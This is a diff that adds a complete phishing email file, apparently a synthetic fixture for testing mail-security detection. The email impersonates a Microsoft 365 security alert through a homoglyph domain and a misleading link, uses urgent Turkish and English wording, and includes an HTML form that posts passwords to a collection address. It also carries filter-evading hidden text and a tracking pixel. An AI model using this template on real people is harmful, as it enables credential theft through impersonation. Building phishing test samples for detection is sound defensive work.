@@ -1,0 +1,43 @@
+Return-Path: <bounce-9841@mailer-relay.cfd>
+Received: from mx-edge.acme-corp.internal (10.24.0.8) by mailstore.acme-corp.internal with ESMTPS id 8F2A1; Mon, 23 Nov 2026 09:14:22 +0300
+Received: from vps-419.bullet-host.xyz (185.220.101.44) by mx-edge.acme-corp.internal (198.51.100.12) with ESMTP id 7D11B; Mon, 23 Nov 2026 09:16:40 +0300
+Received: from [192.168.1.55] (helo=DESKTOP-PHISH) by vps-419.bullet-host.xyz (185.220.101.44) with SMTP id 1A09; Mon, 23 Nov 2026 09:14:05 +0300
+Authentication-Results: mx-edge.acme-corp.internal;
+ spf=fail (sender IP is 185.220.101.44) smtp.mailfrom=mailer-relay.cfd;
+ dkim=fail (body hash did not verify) header.d=microsoft-security-alert.xyz;
+ dmarc=fail (p=REJECT) header.from=microsoft-security-alert.xyz
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft-security-alert.xyz; s=s1; h=from:to:subject:date; bh=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=; b=SYNTHETIC_TEST_SIG
+From: "Microsoft 365 Security <security@microsoft.com>" <alerts@xn--micrsoft-qbh.xyz>
+Reply-To: verify-desk@secure-portal-verify.top
+To: analyst@acme-corp.example
+Subject: =?UTF-8?B?W0FDxLBMXSBNaWNyb3NvZnQgMzY1IMWeaWZyZW5pemkgMjQgU2FhdCDEsMOnaW5kZSBEb8SfcnVsYXnEsW4=?=
+Date: Mon, 23 Nov 2026 09:13:50 +0300
+Message-ID: <99281741.phish@vps-419.bullet-host.xyz>
+X-Mailer: Gophish
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_Part_Homoglyph_01"
+
+------=_Part_Homoglyph_01
+Content-Type: text/plain; charset=UTF-8
+
+Urgent action required: Your Microsoft 365 account will be suspended within 24 hours.
+Verify your password immediately: https://xn--micrsoft-qbh.xyz/owa/login?u=analyst
+Backup link: https://bit.ly/3xSYNTHETIC
+
+------=_Part_Homoglyph_01
+Content-Type: text/html; charset=UTF-8
+
+<html><body style="font-family:Arial,sans-serif;background:#f8fafc;padding:24px">
+<div style="max-width:560px;background:#fff;border:1px solid #e2e8f0;padding:24px;border-radius:8px">
+<h2 style="color:#b91c1c">Microsoft 365 — Acil Oturum Do​​​​​​​ğrulama</h2>
+<p>Hesabınız 24 saat içinde askıya alınacaktır. Lütfen şifrenizi doğrulayın (Your account will be suspended within 24 hours — verify your password).</p>
+<p>Portal: <a href="https://xn--micrsoft-qbh.xyz/office365/login?redirect=https%3A%2F%2F198.51.100.77%2Fharvest">https://login.microsoftonline.com/common/oauth2</a></p>
+<form action="http://198.51.100.77/collect" method="POST">
+  <label>Kurumsal Şifre / Password:</label><br/>
+  <input type="password" name="pwd" placeholder="••••••••" /><br/>
+  <button type="submit">Doğrula / Verify</button>
+</form>
+<div style="display:none;font-size:0px">benign newsletter quarterly summary finance update calendar invite</div>
+<img src="https://track.mailer-relay.cfd/pixel/open.png?id=9841" width="1" height="1" />
+</div></body></html>
+------=_Part_Homoglyph_01--
